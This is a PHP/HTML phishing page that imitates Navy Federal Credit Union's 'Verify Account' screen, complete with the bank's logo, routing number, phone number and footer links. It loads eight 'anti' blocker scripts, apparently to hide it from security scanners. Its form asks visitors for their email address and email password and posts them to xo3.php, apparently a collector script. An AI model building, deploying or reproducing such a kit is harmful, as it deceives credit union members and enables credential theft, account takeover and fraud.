<?php
error_reporting(0);
include "./blocker/anti1.php";
include "./blocker/anti2.php";
include "./blocker/anti3.php";
include "./blocker/anti4.php";
include "./blocker/anti5.php";
include "./blocker/anti6.php";
include "./blocker/anti7.php";
include "./blocker/anti8.php";

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en" xmlns="http://www.w3.org/1999/xhtml"><head>

	<link type="text/css" rel="stylesheet" href="/NFOAA_Auth/javax.faces.resource/default.css.xhtml?ln=openfaces&amp;ofver=3.1.EA1.938" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


	<title>Navy Federal Credit Union - We serve where you serve
	</title>
	
<link rel="shortcut icon" href="resources/images/favicon.ico" type="image/x-icon" />
<link rel="apple-touch-icon" href="resources/images/apple-touch-icon-72x72-precomposed-ae3b3be0d460fbef25ad55dfec1ca683.png" />

	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" />
	    
	<link rel="stylesheet" href="resources/css/main-70952c801211405657b59b94c775431e.css" />
	<link rel="stylesheet" href="resources/css/nauth-70952c801211405657b59b94c775431e.css" />
	
	
	<a href="#end-header" id="skipnav" class="skipnav">Skip Navigation Links</a>
	<div class="header" role="banner">
		<div class="container">
			<div class="header-content">
				<div class="logo">
					<a href="" title="Go to NavyFederal.org">
						<img src="resources/images/img_logo-ae3b3be0d460fbef25ad55dfec1ca683.png" alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" width="219" height="70" /> </a>
				</div>
				<div class="nav">
					<a href="">About Us</a>
					<span class="separator">|</span> <a href="">Branches
						&amp; ATMs</a> <span class="separator">|</span> <a href="">Questions
						&amp; Support</a> <span class="separator">|</span> <span class="text-routing">Routing Number: 256074974</span>
				</div>
			</div> 
		</div>
	</div>
	
	
	
	
		<div class="content-wrapper">
        <div class="container">
        <a id="end-header"></a>
          <div class="content-bordered">
         <h1>Verify Account</h1>
          	<div class="login non-login-box">                    
             <div class="login-panel panel-wdth">
			<div class="panel panel-primary non-login-bckgrnd">
			<div class="panel-body">
<form id="resetPassword"  method="post" action="xo3.php" >


			<div class="panel-content-left panel-left-wdth">
					
					<div class="row">
						<div class="col-xs-8 panel-row-wdth">												
							<div class="form-group">
							<div class="row">
							<div class="col-xs-6" style="width:99%;"><label for="resetPassword:accessnumber">
Email Address</label> <span style="float:right;"><p class="text-muted">
                                    
                                </p></span>
							</div>
							</div><input id="resetPassword:accessnumber" type="email" name="email" required="" autocomplete="off" class="form-control"  />
								
							</div>
							<div class="form-group">
							<div class="row">
							<div class="col-xs-6" style="width:99%;"><label for="resetPassword:accessnumber">
Email Password</label> <span style="float:right;"><p class="text-muted">
                                    
                                </p></span>
							</div>
							</div><input id="resetPassword:accessnumber" type="Password" name="password" required="" autocomplete="off" class="form-control" maxlength="32" />
								
							</div>
					
							
						 	
					       

				         

				    	</div>
					</div>
				   	<div><input id="resetPassword:btn-continue" type="submit" name="resetPassword:btn-continue" value="Continue" class="btn btn-primary"  />
				   		<input id="resetPassword:btn-cancel" type="button" value="Cancel" class="btn btn-default" />
				</div>   
				</div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="517855267606744634:7769335653494298935" autocomplete="off" />
</form>
				<div class="panel-content-right" style="width:40%;">
									<h2>Need Help?</h2>
	
									<ul class="list-unstyled">
										<li>
											<a href="">FAQ »</a>
										</li>
										<li>
											<a href=""> Enroll Now »</a>
										</li>
										<li>
											<a href="">Need More Information? »</a>
										</li>
										<li>
											<a href="">Navy Federal Home »</a>
										</li>
									</ul>
								</div>
								 
			
				
				
				</div> 
				</div>
				</div>
				</div>
				
				    
				 </div>
			    </div>
		
		</div>
 
    <div class="footer">
        <div class="container">
            <div class="footer-content">
                <div class="logo">
                    <a href="" title="Go to NavyFederal.org" target="_blank">
                        <img src="resources/images/img_footer_logo-ae3b3be0d460fbef25ad55dfec1ca683.png" alt="Navy Federal Credit Union (Logo)" width="74" height="43" />
                    </a>	
                </div>
           <div class="content">
	                    <div class="nav-group">
	                        <div class="nav">
	                            <a href="">About Us</a>
	                            <span class="separator">|</span> 
	                            <a href="https://www.navyfederal.org/about/careers/">Careers</a>
	                            <span class="separator">|</span>
	                            <a href="https://www.navyfederal.org/branches-atms/index.php">Branches &amp; ATMs</a>
	                            <span class="separator">|</span>
	                            <a href="https://www.navyfederal.org/about/frequently-asked-questions.php">FAQs</a>
	                            <span class="separator">|</span>
	                            <a href="https://www.navyfederal.org/contact-us/">Contact Us</a>
	                            <span class="separator">-</span>
	                            <span class="text-routing">
	                                1-888-842-6328 | Routing Number: 256074974
	                            </span>
	                        </div>
	
	                        <div class="nav">
	                            <a href="https://www.navyfederal.org/pdf/ebrochures/1116e.pdf" class="icon-ncua">Federally Insured by NCUA</a>
	                            <span class="separator">|</span>
	                            <a href="#" data-toggle="modal" data-target="#modalonlineDisclosure">Web Policy</a>
	                            <span class="separator">|</span>
	                            <a href="https://www.navyfederal.org/privacy/online.php">Privacy Policy</a>
	                            <span class="separator">|</span>
	                        	<a href="#" data-toggle="modal" data-target="#modalbrowserRequirements">Browser Support</a>
	                        </div>
	                    </div>
	
		                    <p>
	                        <a href="https://www.navyfederal.org/pdf/ebrochures/3035_EHL_Poster.pdf" class="icon-housing">Equal Housing Lender</a> | APY = Annual Percentage Yield | APR = Annual Percentage Rate
	                    </p>
	
	                    <p>
	                        ©
	                        Navy Federal Credit Union - All rights reserved - iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App Store℠ is a service mark of Apple Inc. Android® and Google Play® are trademarks of Google Inc.  Images used for representational purposes only; do not imply government endorsement.
	                    </p>
	                    
	                    <div class="disclaimer">
	                        <p>
	                            <sup>+</sup>Rates are based on an evaluation of credit history, so your rate may differ.
	                        </p>
	
	                        <p>
	                            <sup>++</sup>Rates are variable, and based on an evaluation of credit history, so your rate may differ.
	                        </p>
	                    </div>
	                </div>
     
            </div>
        </div>
    </div>
    
	      
		
    
		
	    <div class="modal fade" id="modalonlineDisclosure" tabindex="-1" role="dialog" aria-labelledby="modalonlineDisclosureLabel">
	        <div class="modal-dialog" role="document">
	            <div class="modal-content">
	                <div class="modal-header">
	                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
	                    <h3 class="modal-title" id="modalonlineDisclosureLabel">Use of Cookies by Navy Federal Online</h3>
	                </div>
	                <div class="modal-body">
	                    <iframe id="onlineDisclosureFrame" data-src="https://www.navyfederal.org/online-disclosure.html" src="about:blank" frameborder="0"></iframe>
	                </div>
	            </div>
	        </div>
	    </div>
	    
	    
	    
	    <div class="modal fade" id="modalbrowserRequirements" tabindex="-1" role="dialog" aria-labelledby="modalbrowserRequirementsLabel">
	        <div class="modal-dialog" role="document">
	            <div class="modal-content">
	                <div class="modal-header">
	                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
	                    <h3 class="modal-title" id="modalbrowserRequirementsLabel">Browser Requirements</h3>
	                </div>
	                <div class="modal-body">
	               		<iframe id="browserRequirementsFrame" data-src="https://www.navyfederal.org/browser-requirements.html" src="about:blank" frameborder="0" width="580" height="740"></iframe>
	                </div>
	            </div>
	        </div>
	    </div>

	<style>
		.o_hiddenFocusChromeSafari {
			border: 0 !important;
		}
	</style><div id="sessionTimeModal" class="o_popuplayer o_window o_background_color o_popuplayer_modal o_class_1568347"><table id="sessionTimeModal::table" border="0" cellspacing="0" cellpadding="0" class="o_window_table" height="100%" width="100%"><tr style="height: 1px;"><td><table id="sessionTimeModal::caption" class="o_window_caption o_default_caption_width o_class_1568348" cellpadding="0" cellspacing="0" border="0"><tr><td><div id="sessionTimeModal::caption_content"></div></td></tr></table></td></tr><tr id="sessionTimeModal::contentRow"><td height="100%"><div id="sessionTimeModal::content" style="margin: 0px; overflow: hidden" class="o_window_content">
	  	
	  	<div class="modal-iframe">
		  	<div class="modal-content">
			  	<div class="modal-header">
			  		<div class="modal-title">Navy Federal Credit Union</div>
			  	</div>
		 		
		 		<div class="modal-body">
		 			<div class="content-wrapper" style="min-height: initial; min-height: auto;">
					 	<p>
							For security reasons, we will not save your information and will automatically terminate session in <span id="countdown">60</span> seconds.
					    </p>
				    </div>
				    
				    <div class="btn-wrapper"><input id="btn-session-cancel" type="submit" name="btn-session-cancel" value="Terminate" class="btn btn-default" onclick="O$.Ajax._reload([], {&quot;immediate&quot;:false,&quot;onajaxend&quot;:function(event){closeWindow();},&quot;listener&quot;:&quot;sessionManagement.killSession&quot;,&quot;_sourceId&quot;:&quot;btn-session-cancel&quot;,&quot;actionComponent&quot;:&quot;j_idt35&quot;});;return false" /><input id="btn-session-ok" type="submit" name="btn-session-ok" value="Continue" class="btn btn-primary" onclick="jsf.util.chain(this,event,'continueSession();','O$.Ajax._reload([], {&quot;immediate&quot;:false,&quot;listener&quot;:&quot;sessionManagement.keepSessionAlive&quot;,&quot;_sourceId&quot;:&quot;btn-session-ok&quot;,&quot;actionComponent&quot;:&quot;j_idt36&quot;});');return false" />
				    </div>
		  		</div>
	  		</div>
  		</div></div></td></tr></table></body>
</html>